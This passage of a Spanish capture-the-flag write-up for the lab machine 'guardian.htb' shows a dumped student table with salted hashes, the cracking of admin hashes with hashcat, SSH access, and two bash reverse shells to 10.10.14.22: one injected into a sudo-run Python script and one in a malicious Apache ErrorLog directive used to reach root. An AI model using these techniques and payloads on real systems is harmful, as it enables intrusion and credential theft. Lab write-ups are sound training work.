|      16 | GU0762023          | e7ff40179d9a905bc8916e020ad97596548c0f2246bfb7df9921cc8cdaa20ac2 | Milly Saladine       | GU0762023@guardian.htb          | 1995-11-19 | 2031 Black Stone Place, San Francisco, California, United States, 94132       | student   | active | 2025-09-28 16:00:03 | 2025-09-28 16:00:03 |
|      17 | GU9492024          | 8ae72472bd2d81f774674780aef36fc20a0234e62cdd4889f7b5a6571025b8d1 | Maggy Clout          | GU9492024@guardian.htb          | 2000-05-30 | 8322 Richland Road, Billings, Montana, United States, 59112                   | student   | active | 2025-09-28 16:00:03 | 2025-09-28 16:00:03 |
|      18 | GU9612024          | cf54d11e432e53262f32e799c6f02ca2130ae3cff5f595d278d071ecf4aeaf57 | Shawnee Bazire       | GU9612024@guardian.htb          | 2002-05-27 | 4364 Guadalupe Court, Pensacola, Florida, United States, 32520                | student   | active | 2025-09-28 16:00:03 | 2025-09-28 16:00:03 |
|      19 | GU7382024          | 7852ec8fcfded3f1f6b343ec98adde729952b630bef470a75d4e3e0da7ceea1a | Jobey Dearle-Palser  | GU7382024@guardian.htb          | 1998-04-14 | 4620 De Hoyos Place, Tampa, Florida, United States, 33625                     | student   | active | 2025-09-28 16:00:03 | 2025-09-28 16:00:03 |
|      20 | GU6632023          | 98687fb5e0d6c9004c09dadbe85b69133fd24d5232ff0a3cf3f768504e547714 | Erika Sandilands     | GU6632023@guardian.htb          | 1994-06-08 | 1838 Herlong Court, San Bernardino, California, United States, 92410          | student   | active | 2025-09-28 16:00:03 | 2025-09-28 16:00:03 |
|      21 | GU1922024          | bf5137eb097e9829f5cd41f58fc19ed472381d02f8f635b2e57a248664dd35cd | Alisander Turpie     | GU1922024@guardian.htb          | 1998-08-07 | 813 Brody Court, Bakersfield, California, United States, 93305                | student   | active | 2025-09-28 16:00:03 | 2025-09-28 16:00:03 |
|      22 | GU8032023          | 41b217df7ff88d48dac1884a8c539475eb7e7316f33d1ca5a573291cfb9a2ada | Wandie McRobbie      | GU8032023@guardian.htb          | 2002-01-16 | 5732 Eastfield Path, Peoria, Illinois, United States, 61629                   | student   | active | 2025-09-28 16:00:03 | 2025-09-28 16:00:03 |
|      23 | GU5852023          | e02610ca77a91086c85f93da430fd2f67f796aab177c88d789720ca9b724492a | Erinn Franklyn       | GU5852023@guardian.htb          | 2003-05-01 | 50 Lindsey Lane Court, Fairbanks, Alaska, United States, 99790                | student   | active | 2025-09-28 16:00:03 | 2025-09-28 16:00:03 |
|      24 | GU0712023          | e6aad48962fd44e506ac16d81b5e4587cad2fd2dc51aabbf193f4fd29d036a7a | Niel Slewcock        | GU0712023@guardian.htb          | 1996-05-04 | 3784 East Schwartz Boulevard, Gainesville, Florida, United States, 32610      | student   | active | 2025-09-28 16:00:03 | 2025-09-28 16:00:03 |
|      25 | GU1592025          | 1710aed05bca122521c02bff141c259a81a435f900620306f92b840d4ba79c71 | Chryste Lamputt      | GU1592025@guardian.htb          | 1993-05-22 | 6620 Anhinga Lane, Baton Rouge, Louisiana, United States, 70820               | student   | active | 2025-09-28 16:00:03 | 2025-09-28 16:00:03 |
|      26 | GU1112023          | 168ae18404da4fff097f9218292ae8f93d6c3ac532e609b07a1c1437f2916a7d | Kiersten Rampley     | GU1112023@guardian.htb          | 1997-06-28 | 9990 Brookdale Court, New York City, New York, United States, 10292           | student   | active | 2025-09-28 16:00:03 | 2025-09-28 16:00:03 |
|      27 | GU6432025          | a28e58fd78fa52c651bfee842b1d3d8f5873ae00a4af56a155732a4a6be41bc6 | Gradeigh Espada      | GU6432025@guardian.htb          | 1999-06-06 | 5464 Lape Lane, Boise, Idaho, United States, 83757                            | student   | active | 2025-09-28 16:00:03 | 2025-09-28 16:00:03 |
|      28 | GU3042024          | d72fc47472a863fafea2010efe6cd4e70976118babaa762fef8b68a35814e9ab | Susanne Myhill       | GU3042024@guardian.htb          | 2003-04-12 | 11585 Homan Loop, Aiken, South Carolina, United States, 29805                 | student   | active | 2025-09-28 16:00:03 | 2025-09-28 16:00:03 |
|      29 | GU1482025          | be0145f24b8f6943fd949b7ecaee55bb9d085eb3e81746826374c52e1060785f | Prudi Sweatman       | GU1482025@guardian.htb          | 1998-05-10 | 1533 Woodmill Terrace, Palo Alto, California, United States, 94302            | student   | active | 2025-09-28 16:00:03 | 2025-09-28 16:00:03 |
|      30 | GU3102024          | 3aa2232d08262fca8db495c84bd45d8c560e634d5dff8566f535108cf1cc0706 | Kacey Qualtrough     | GU3102024@guardian.htb          | 1996-03-09 | 14579 Ayala Way, Spokane, Washington, United States, 99252                    | student   | active | 2025-09-28 16:00:03 | 2025-09-28 16:00:03 |
|      31 | GU7232023          | 4813362e8d6194abfb20154ba3241ade8806445866bce738d24888aa1aa9bea6 | Thedrick Grimstead   | GU7232023@guardian.htb          | 1998-05-20 | 13789 Castlegate Court, Salt Lake City, Utah, United States, 84130            | student   | active | 2025-09-28 16:00:03 | 2025-09-28 16:00:03 |
|      32 | GU8912024          | 6c249ab358f6adfc67aecb4569dae96d8a57e3a64c82808f7cede41f9a330c51 | Dominik Clipsham     | GU8912024@guardian.htb          | 1999-06-30 | 7955 Lock Street, Kansas City, Missouri, United States, 64160                 | student   | active | 2025-09-28 16:00:03 | 2025-09-28 16:00:03 |
|      33 | GU4752025          | 4d7625ec0d45aa83ef374054c8946497a798ca6a3474f76338f0ffe829fced1a | Iain Vinson          | GU4752025@guardian.htb          | 1990-10-13 | 10384 Zeeland Terrace, Cleveland, Ohio, United States, 44105                  | student   | active | 2025-09-28 16:00:03 | 2025-09-28 16:00:03 |
|      34 | GU9602024          | 6eeb4b329b7b7f885df9757df3a67247df0a7f14b539f01d3cb988e4989c75e2 | Ax Sweating          | GU9602024@guardian.htb          | 1994-06-22 | 4518 Vision Court, Sarasota, Florida, United States, 34233                    | student   | active | 2025-09-28 16:00:03 | 2025-09-28 16:00:03 |
|      35 | GU4382025          | 8d57c0124615f5c82cabfdd09811251e7b2d70dcf2d3a3b3942a31c294097ec8 | Trixi Piolli         | GU4382025@guardian.htb          | 2001-02-02 | 11634 Reid Road, Charleston, South Carolina, United States, 29424             | student   | active | 2025-09-28 16:00:03 | 2025-09-28 16:00:03 |
|      36 | GU7352023          | 8c9a8f4a6daceecb6fff0eae3830d16fe7e05a98101cb21f1b06d592a33cb005 | Ronni Fulton         | GU7352023@guardian.htb          | 1998-11-07 | 4690 Currituck Terrace, Vero Beach, Florida, United States, 32964             | student   | active | 2025-09-28 16:00:03 | 2025-09-28 16:00:03 |
|      37 | GU3042025          | 1d87078236f9da236a92f42771749dad4eea081a08a5da2ed3fa5a11d85fa22f | William Lidstone     | GU3042025@guardian.htb          | 1998-03-18 | 11566 Summerchase Loop, Providence, Rhode Island, United States, 02905        | student   | active | 2025-09-28 16:00:03 | 2025-09-28 16:00:03 |
|      38 | GU3872024          | 12a2fe5b87191fedadc7d81dee2d483ab2508650d96966000f8e1412ca9cd74a | Viola Bridywater     | GU3872024@guardian.htb          | 2003-07-21 | 9436 Erica Chambers Avenue, Bronx, New York, United States, 10454             | student   | active | 2025-09-28 16:00:03 | 2025-09-28 16:00:03 |
|      39 | GU7462025          | 5e95bfd3675d0d995027c392e6131bf99cf2cfba73e08638fa1c48699cdb9dfa | Glennie Crilly       | GU7462025@guardian.htb          | 1995-01-26 | 3423 Carla Fink Court, Washington, District of Columbia, United States, 20580 | student   | active | 2025-09-28 16:00:03 | 2025-09-28 16:00:03 |
|      40 | GU3902023          | 6b4502ad77cf9403e9ac3338ff7da1c08688ef2005dae839c1cd6e07e1f6409b | Ninnette Lenchenko   | GU3902023@guardian.htb          | 1994-11-06 | 12277 Richey Road, Austin, Texas, United States, 78754                        | student   | active | 2025-09-28 16:00:03 | 2025-09-28 16:00:03 |
|      41 | GU1832025          | 6ab453e985e31ef54419376be906f26fff02334ec5f26a681d90c32aec6d311f | Rivalee Coche        | GU1832025@guardian.htb          | 1990-10-23 | 2999 Indigo Avenue, Washington, District of Columbia, United States, 20022    | student   | active | 2025-09-28 16:00:03 | 2025-09-28 16:00:03 |
|      42 | GU3052024          | 1cde419d7f3145bcfcbf9a34f80452adf979f71496290cf850944d527cda733f | Lodovico Atlay       | GU3052024@guardian.htb          | 1992-04-16 | 5803 Clarendon Court, Little Rock, Arkansas, United States, 72231             | student   | active | 2025-09-28 16:00:03 | 2025-09-28 16:00:03 |
|      43 | GU3612023          | 7ba8a71e39c1697e0bfa66052285157d2984978404816c93c2a3ddaba6455e3a | Maris Whyborne       | GU3612023@guardian.htb          | 1999-08-07 | 435 Quaint Court, Staten Island, New York, United States, 10305               | student   | active | 2025-09-28 16:00:03 | 2025-09-28 16:00:03 |
|      44 | GU7022023          | 7a02cc632b8cb1a6f036cb2c963c084ffea9184a92259d932e224932fdad81a8 | Diahann Forber       | GU7022023@guardian.htb          | 1998-12-17 | 10094 Ely Circle, New Haven, Connecticut, United States, 06533                | student   | active | 2025-09-28 16:00:03 | 2025-09-28 16:00:03 |
|      45 | GU1712025          | ebfa2119ebe2aaed2c329e25ce2e5ed8efa2d78e72c273bb91ff968d02ee5225 | Sinclair Tierney     | GU1712025@guardian.htb          | 1999-11-04 | 2885 Columbia Way, Seattle, Washington, United States, 98127                  | student   | active | 2025-09-28 16:00:03 | 2025-09-28 16:00:03 |
|      46 | GU9362023          | 8b7ce469fb40e88472c9006cb1d65ffa20b2f9c41e983d49ca0cdf642d8f1592 | Leela Headon         | GU9362023@guardian.htb          | 1992-10-24 | 14477 Donelin Circle, El Paso, Texas, United States, 88589                    | student   | active | 2025-09-28 16:00:03 | 2025-09-28 16:00:03 |
|      47 | GU5092024          | 11ae26f27612b1adca57f14c379a8cc6b4fc5bdfcfd21bef7a8b0172b7ab4380 | Egon Jaques          | GU5092024@guardian.htb          | 1995-04-19 | 12886 Chimborazo Way, Fort Lauderdale, Florida, United States, 33315          | student   | active | 2025-09-28 16:00:03 | 2025-09-28 16:00:03 |
|      48 | GU5252023          | 70a03bb2060c5e14b33c393970e655f04d11f02d71f6f44715f6fe37784c64fa | Meade Newborn        | GU5252023@guardian.htb          | 2003-09-02 | 3679 Inman Mills Road, Orlando, Florida, United States, 32859                 | student   | active | 2025-09-28 16:00:03 | 2025-09-28 16:00:03 |
|      49 | GU8802025          | 7ae4ac47f05407862cb2fcd9372c73641c822bbc7fc07ed9d16e6b63c2001d76 | Tadeo Sproson        | GU8802025@guardian.htb          | 2002-08-01 | 4293 Tim Terrace, Springfield, Illinois, United States, 62776                 | student   | active | 2025-09-28 16:00:03 | 2025-09-28 16:00:03 |
|      50 | GU2222023          | d3a175c6e9da02ae83ef1f2dd1f59e59b8a63e5895b81354f7547714216bbdcd | Delia Theriot        | GU2222023@guardian.htb          | 2001-07-15 | 5847 Beechwood Avenue, Chattanooga, Tennessee, United States, 37450           | student   | active | 2025-09-28 16:00:03 | 2025-09-28 16:00:03 |
|      51 | GU9802023          | a03da309de0a60f762ce31d0bde5b9c25eb59e740719fc411226a24e72831f5c | Ransell Dourin       | GU9802023@guardian.htb          | 1995-01-04 | 1809 Weaton Court, Chattanooga, Tennessee, United States, 37410               | student   | active | 2025-09-28 16:00:03 | 2025-09-28 16:00:03 |
|      52 | GU3122025          | e96399fcdb8749496abc6d53592b732b1b2acb296679317cf59f104a5f51343a | Franklyn Kuhndel     | GU3122025@guardian.htb          | 1991-06-05 | 11809 Mccook Street, Shawnee Mission, Kansas, United States, 66210            | student   | active | 2025-09-28 16:00:03 | 2025-09-28 16:00:03 |
|      53 | GU2062025          | 0ece0b43e6019e297e0bce9f07f200ff03d629edbed88d4f12f2bad27e7f4df8 | Petronille Scroggins | GU2062025@guardian.htb          | 2001-06-16 | 11794 Byron Place, Des Moines, Iowa, United States, 50981                     | student   | active | 2025-09-28 16:00:03 | 2025-09-28 16:00:03 |
|      54 | GU3992025          | b86518d246a22f4f5938444aa18f2893c4cccabbe90ca48a16be42317aec96a0 | Kittie Maplesden     | GU3992025@guardian.htb          | 2001-10-04 | 6212 Matisse Avenue, Palatine, Illinois, United States, 60078                 | student   | active | 2025-09-28 16:00:03 | 2025-09-28 16:00:03 |
|      55 | GU1662024          | 5c28cd405a6c0543936c9d010b7471436a7a33fa64f5eb3e84ab9f7acc9a16e5 | Gherardo Godon       | GU1662024@guardian.htb          | 2002-04-17 | 9997 De Hoyos Place, Simi Valley, California, United States, 93094            | student   | active | 2025-09-28 16:00:03 | 2025-09-28 16:00:03 |
|      56 | GU9972025          | 339d519ef0c55e63ebf4a8fde6fda4bca4315b317a1de896fb481bd0834cc599 | Kippar Surpliss      | GU9972025@guardian.htb          | 1990-08-10 | 5372 Gentle Terrace, San Francisco, California, United States, 94110          | student   | active | 2025-09-28 16:00:03 | 2025-09-28 16:00:03 |
|      57 | GU6822025          | 298560c0edce3451fd36b69a15792cbb637c8366f058cf674a6964ff34306482 | Sigvard Reubens      | GU6822025@guardian.htb          | 2003-04-23 | 5711 Magana Place, Memphis, Tennessee, United States, 38104                   | student   | active | 2025-09-28 16:00:03 | 2025-09-28 16:00:03 |
|      58 | GU7912023          | 8236b81b5f67c798dd5943bca91817558e987f825b6aae72a592c8f1eaeee021 | Carly Buckler        | GU7912023@guardian.htb          | 1991-09-07 | 2298 Hood Place, Springfield, Massachusetts, United States, 01105             | student   | active | 2025-09-28 16:00:03 | 2025-09-28 16:00:03 |
|      59 | GU3622024          | 1c92182d9a59d77ea20c0949696711d8458c870126cf21330f61c2cba6ae6bcf | Maryjo Gration       | GU3622024@guardian.htb          | 1997-04-25 | 1998 Junction Place, Irvine, California, United States, 92619                 | student   | active | 2025-09-28 16:00:03 | 2025-09-28 16:00:03 |
|      60 | GU2002023          | 3c378b73442c2cf911f2a157fc9e26ecde2230313b46876dab12a661169ed6e2 | Paulina Mainwaring   | GU2002023@guardian.htb          | 1993-05-04 | 11891 Markridge Loop, Olympia, Washington, United States, 98506               | student   | active | 2025-09-28 16:00:03 | 2025-09-28 16:00:03 |
|      61 | GU3052023          | 2ef01f607f86387d0c94fc2a3502cc3e6d8715d3b1f124b338623b41aed40cf8 | Curran Foynes        | GU3052023@guardian.htb          | 2000-12-04 | 7021 Cordelia Place, Paterson, New Jersey, United States, 07505               | student   | active | 2025-09-28 16:00:03 | 2025-09-28 16:00:03 |
|      62 | GU1462023          | 585aacf74b22a543022416ed771dca611bd78939908c8323f4f5efef5b4e0202 | Cissy Styan          | GU1462023@guardian.htb          | 1991-01-10 | 1138 Salinas Avenue, Orlando, Florida, United States, 32854                   | student   | active | 2025-09-28 16:00:03 | 2025-09-28 16:00:03 |
+---------+--------------------+------------------------------------------------------------------+----------------------+---------------------------------+------------+-------------------------------------------------------------------------------+-----------+--------+---------------------+---------------------+
62 rows in set (0.00 sec)

```

Los hashes que nos interesan son los administrativos:

```
# admin
694a63de406521120d9b905ee94bae3d863ff9f6637d7b7cb730f7da535fd6d6
# jamil
c1d8dfaeee103d01a5aec443a98d31294f98c5b4f09a0f02ff4f9a43ee440250
# mark.pargetter
8623e713bb98ba2d46f335d659958ee658eb6370bc4c9ee4ba1cc6f37f97a10e
```
Para crackear estos hashes indagamos un poco en el codigo de configuracion en el repo

```php
<?php
return [
    'db' => [
        'dsn' => 'mysql:host=localhost;dbname=guardiandb',
        'username' => 'root',
        'password' => 'Gu4rd14n_un1_1s_th3_b3st',
        'options' => []
    ],
    'salt' => '8Sb)tM1vs1SS'
];
```
Guardamos el salt y los hashes en un archivo de texto de la siguiente manera:

```bash
admin:694a63de406521120d9b905ee94bae3d863ff9f6637d7b7cb730f7da535fd6d6:8Sb)tM1vs1SS
jamil.enockson:c1d8dfaeee103d01a5aec443a98d31294f98c5b4f09a0f02ff4f9a43ee440250:8Sb)tM1vs1SS
mark.pargetter:8623e713bb98ba2d46f335d659958ee658eb6370bc4c9ee4ba1cc6f37f97a10e:8Sb)tM1vs1SS
```
Vemos adicionalmente en login.php

```php
 $hashed_password = hash('sha256', $password . $salt);
```
Lo cual nos indica el algoritmo de codificacion **sha256**

**Crackeamos**

```bash
hashcat -m 1410 hashes.txt -w 3 -O /usr/share/wordlists/rockyou.txt --username
```

```bash
hashcat -m 1410 hashes.txt -w 3 -O /usr/share/wordlists/rockyou.txt --username --show
admin:694a63de406521120d9b905ee94bae3d863ff9f6637d7b7cb730f7da535fd6d6:8Sb)tM1vs1SS:fakebake000
jamil.enockson:c1d8dfaeee103d01a5aec443a98d31294f98c5b4f09a0f02ff4f9a43ee440250:8Sb)tM1vs1SS:copperhouse56
```

Intentamos primero con admin y no podemos conectarnos.. probamos con jamil:

```bash
ssh jamil@guardian.htb
jamil@guardian.htb's password: 
Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 5.15.0-152-generic x86_64)

jamil@guardian:~$ ls -la
total 28
drwxr-x--- 3 jamil jamil 4096 Jul 14 16:57 .
drwxr-xr-x 6 root  root  4096 Jul 30 14:59 ..
lrwxrwxrwx 1 root  root     9 Jul 14 16:57 .bash_history -> /dev/null
-rw-r--r-- 1 jamil jamil  220 Jan  6  2022 .bash_logout
-rw-r--r-- 1 jamil jamil 3805 Apr 19 07:52 .bashrc
drwx------ 2 jamil jamil 4096 Apr 26 17:27 .cache
lrwxrwxrwx 1 root  root     9 Apr 12 10:15 .mysql_history -> /dev/null
-rw-r--r-- 1 jamil jamil  807 Jan  6  2022 .profile
-rw-r----- 1 root  jamil   33 Sep 27 15:12 user.txt
jamil@guardian:~$ cat user.txt 
42786c0dae007da545bb494c40c7c662
jamil@guardian:~$ 

```

#### paso 3: Movimiento lateral

**Enumeracion**

```bash
jamil@guardian:~$ id
uid=1000(jamil) gid=1000(jamil) groups=1000(jamil),1002(admins)
jamil@guardian:~$ sudo -l
Matching Defaults entries for jamil on guardian:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User jamil may run the following commands on guardian:
    (mark) NOPASSWD: /opt/scripts/utilities/utilities.py

jamil@guardian:~$ cat /opt/scripts/utilities/utilities.py
#!/usr/bin/env python3

import argparse
import getpass
import sys

from utils import db
from utils import attachments
from utils import logs
from utils import status


def main():
    parser = argparse.ArgumentParser(description="University Server Utilities Toolkit")
    parser.add_argument("action", choices=[
        "backup-db",
        "zip-attachments",
        "collect-logs",
        "system-status"
    ], help="Action to perform")
    
    args = parser.parse_args()
    user = getpass.getuser()

    if args.action == "backup-db":
        if user != "mark":
            print("Access denied.")
            sys.exit(1)
        db.backup_database()
    elif args.action == "zip-attachments":
        if user != "mark":
            print("Access denied.")
            sys.exit(1)
        attachments.zip_attachments()
    elif args.action == "collect-logs":
        if user != "mark":
            print("Access denied.")
            sys.exit(1)
        logs.collect_logs()
    elif args.action == "system-status":
        status.system_status()
    else:
        print("Unknown action.")

if __name__ == "__main__":
    main()
```

La unica opcion que tenemos como jamil es system-status la idea seria entonce modificar el script status.py, revisamos el script.

```bash
jamil@guardian:~$ cat /opt/scripts/utilities/utils/status.py
import platform
import psutil
import os

def system_status():
    print("System:", platform.system(), platform.release())
    print("CPU usage:", psutil.cpu_percent(), "%")
    print("Memory usage:", psutil.virtual_memory().percent, "%")
```

No podemos modificar el archivo de forma directa pero podemos generar una copia en /tmp, modificar la copia.. y sobreescribir el original

```bash
jamil@guardian:~$ find / -writable -group admins 2>/dev/null 
/opt/scripts/utilities/output
/opt/scripts/utilities/utils/status.py
```

Creamos la copia:

```bash
jamil@guardian:~$ cp /opt/scripts/utilities/utils/status.py /tmp/status.py.bak
```

Editamos la copia:

```bash
sed -i '/print("Memory usage:/a\   subprocess.run(["/bin/bash", "-c", "bash -i >& /dev/tcp/10.10.14.22/4444 0>&1"])' /tmp/status.py.bak
```
> ademas importamos la libreria subprocess

Sobreescribimos el original con la copia

```bash
jamil@guardian:~$ cp /tmp/status.py.bak /opt/scripts/utilities/utils/status.py
jamil@guardian:~$ cat /opt/scripts/utilities/utils/status.py
import platform
import psutil
import os
import subprocess

def system_status():
    print("System:", platform.system(), platform.release())
    print("CPU usage:", psutil.cpu_percent(), "%")
    print("Memory usage:", psutil.virtual_memory().percent, "%")
    subprocess.run(["/bin/bash", "-c", "bash -i >& /dev/tcp/10.10.14.22/4444 0>&1"])
```

Iniciamos un receptor nc:

```bash
# ejecutamos
jamil@guardian:~$ sudo -u mark /opt/scripts/utilities/utilities.py system-status
System: Linux 5.15.0-152-generic
CPU usage: 0.0 %
Memory usage: 36.1 %
```

Receptor:

```bash
nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.14.22] from (UNKNOWN) [10.10.11.84] 53990
mark@guardian:/home/jamil$ 
```

#### paso 4: Privilege Escalation

**Enumeramos a mark**

```bash
mark@guardian:~$ ls -la
ls -la
total 32
drwxr-x--- 5 mark mark 4096 Sep 28 19:44 .
drwxr-xr-x 6 root root 4096 Jul 30 14:59 ..
lrwxrwxrwx 1 root root    9 Jul 14 16:57 .bash_history -> /dev/null
-rw-r--r-- 1 mark mark  220 Apr 18 10:11 .bash_logout
-rw-r--r-- 1 mark mark 3805 Apr 19 07:52 .bashrc
drwx------ 2 mark mark 4096 Apr 26 09:42 .cache
drwxrwxr-x 2 mark mark 4096 Sep 28 23:00 confs
drwxrwxr-x 3 mark mark 4096 Sep 28 19:20 .local
lrwxrwxrwx 1 root root    9 Apr 19 07:35 .mysql_history -> /dev/null
-rw-r--r-- 1 mark mark  807 Apr 18 10:11 .profile
mark@guardian:~$ sudo -l
sudo -l
Matching Defaults entries for mark on guardian:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User mark may run the following commands on guardian:
    (ALL) NOPASSWD: /usr/local/bin/safeapache2ctl
```

Creamos desde jamil un shell.conf malicioso en /tmp:

```bash
shell.conf
LoadModule mpm_prefork_module /usr/lib/apache2/modules/mod_mpm_prefork.so
ServerRoot "/etc/apache2"
ServerName localhost
PidFile /tmp/apache-rs.pid
Listen 127.0.0.1:8080
ErrorLog "|/bin/bash -c '/bin/bash -i >& /dev/tcp/10.10.14.22/4445 0>&1'"
```

Copiamos el archvio shell.conf en /tmp en el directorio /home/mark/confs y ejecutamos con un receptor activo en 4445

```bash
mark@guardian:~/confs$ sudo /usr/local/bin/safeapache2ctl -f /home/mark/confs/shell.conf
```

Receptor:

```bash
nc -lvnp 4445     
listening on [any] 4445 ...
connect to [10.10.14.22] from (UNKNOWN) [10.10.11.84] 39190
bash: cannot set terminal process group (93042): Inappropriate ioctl for device
bash: no job control in this shell
root@guardian:/etc/apache2# whoami
whoami
root
root@guardian:/etc/apache2# cat /root/root.txt
cat /root/root.txt
0787976d4ec3b5bc24392ff44a79f83e
root@guardian:/etc/apache2# 
```
